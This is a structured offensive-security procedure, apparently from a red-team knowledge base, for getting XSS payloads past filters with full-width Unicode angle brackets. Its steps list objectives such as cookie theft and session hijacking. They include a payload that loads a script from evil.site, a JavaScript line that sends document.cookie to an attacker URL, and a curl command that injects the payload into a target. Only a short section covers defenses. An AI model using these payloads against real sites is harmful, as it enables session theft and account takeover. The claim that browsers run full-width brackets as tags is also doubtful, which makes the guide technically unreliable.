---
id: 4216b76d-1be1-44aa-b9c3-518b09e644af
name: Unicode-Character-Injection-for-XSS-Filter-Bypass
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.823434+00:00'
updated_at: '2023-04-10T20:21:52.674397+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Obfuscated-Files-or-Information|T1027 - Obfuscated Files or
    Information]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter-JavaScript|T1059.007 -
    Command and Scripting Interpreter: JavaScript]]
sub_techniques: []
tags:
  - '[[tags/Bypass-"<"-and-">"-using-＜-and-＞]]'
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/Filter-Bypass-and-Exotic-Payloads]]'
  - xss
  - unicode-injection
  - filter-bypass
commands:
  - '[[commands/curl-inject-unicode-xss-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# Unicode-Character-Injection-for-XSS-Filter-Bypass

## Summary

This procedure demonstrates how to bypass web application XSS filters that only sanitize standard ASCII < and > characters by using their full-width Unicode equivalents (U+FF1C and U+FF1E). By injecting a malicious script tag with these characters into a vulnerable input field, an attacker can execute arbitrary JavaScript in the victim's browser context, enabling session hijacking, data theft, or further exploitation.

## Description

Unicode character injection exploits filters that fail to normalize or detect non-ASCII variants of angle brackets. Many web applications encode user input assuming only standard < > will be used for tags, but full-width versions ＜ and ＞ render similarly in browsers while evading simplistic regex-based sanitization. This technique is particularly effective against legacy or poorly implemented Web Application Firewalls (WAFs) and input validators. The target environment is typically a web form (e.g., search box, comment field) that reflects user input without proper escaping. Success leads to client-side code execution, aligning with JavaScript interpreter abuse for payload delivery. Prerequisites include identifying a reflected or stored XSS vector via manual testing or tools like Burp Suite.

## Requirements

1. Access to a web application with a vulnerable input field that reflects user input (e.g., search, profile, or comment forms).
2. Knowledge of Unicode full-width characters: ＜ (U+FF1C) and ＞ (U+FF1E).
3. A controlled domain or external resource (e.g., evil.site) hosting the malicious payload (poc.js).
4. Optional: Proxy tool like Burp Suite for intercepting and modifying requests.

## Defense

- Implement comprehensive input validation and sanitization on the server-side, including Unicode normalization (e.g., using NFKC normalization to convert full-width to half-width characters).
- Deploy a Content Security Policy (CSP) to restrict inline script execution and external resource loading.
- Use Web Application Firewalls (WAFs) with Unicode-aware rules and regularly update filters to detect variant characters.
- Enable browser security features like XSS Auditor and conduct regular code audits for reflection points.

## Objectives

1. Bypass XSS filters to inject and execute malicious JavaScript in the victim's browser.
2. Steal sensitive information such as cookies, session tokens, or form data.
3. Hijack user sessions to perform unauthorized actions on behalf of the victim.
4. Deliver additional malware or redirect the victim to phishing sites.

## Instructions

### Step 1: Identify Vulnerable Input Field

**Context**: Locate a web form or parameter that echoes user input directly into the page without proper sanitization. This could be a search box, username field, or URL parameter. Test basic XSS payloads like <script>alert(1)</script> to confirm filtering of standard characters.

**Why**: This step verifies the presence of an XSS vector and understands the filter's behavior, ensuring the Unicode bypass is applicable.

No command required for identification; use browser developer tools to inspect reflected input.

**Expected Output**: Confirmation that standard < > are blocked (e.g., literal display or stripping), but input is reflected.

### Step 2: Craft Unicode Payload

**Context**: Replace standard angle brackets with full-width Unicode equivalents in a script tag payload. Reference the code snippet [[codes/Unicode-Fullwidth-Script-Tag-XSS-Payload]] for the exact injection string.

**Why**: Full-width characters evade ASCII-only filters while browsers interpret them as valid tags, allowing script execution.

Embed the payload: ＜script/src=//evil.site/poc.js＞ where poc.js contains your malicious JavaScript (e.g., document.location='http://evil.site/steal?cookie='+document.cookie).

**Expected Output**: A valid-looking script tag that won't trigger filter alerts during submission.

### Step 3: Inject Payload via HTTP Request

**Context**: Submit the crafted payload to the vulnerable endpoint using a tool like curl to simulate the injection.

**Command** ([[commands/curl-inject-unicode-xss-payload]]):
```bash
curl -X POST -d "search=＜script/src=//evil.site/poc.js＞" http://target.com/search
```

**Why**: This delivers the payload to the server, which reflects it back in the response for browser execution. Use POST for forms or GET for URL parameters.

> If using a proxy, intercept the request in Burp Suite, modify the payload, and forward. Upon success, the browser loads and executes poc.js from evil.site.

**Expected Output**: Server response containing the reflected payload, which renders as an executable script tag in the browser (e.g., network tab shows request to evil.site).

### Step 4: Verify Execution

**Context**: Load the target page in a browser after submission and check for payload execution.

**Why**: Confirms the bypass worked and the script ran, allowing further exploitation.

Monitor your evil.site logs for incoming requests or use alert() in poc.js for immediate visual confirmation.

**Expected Output**: Execution indicators like a popup alert, stolen data exfiltrated to your server, or session hijacking effects.

**Success Indicators**:
- Malicious script loads from external domain without filter blocks.
- No server-side errors; payload reflects intact.
- Browser executes JavaScript (e.g., console logs or network traffic to attacker server).
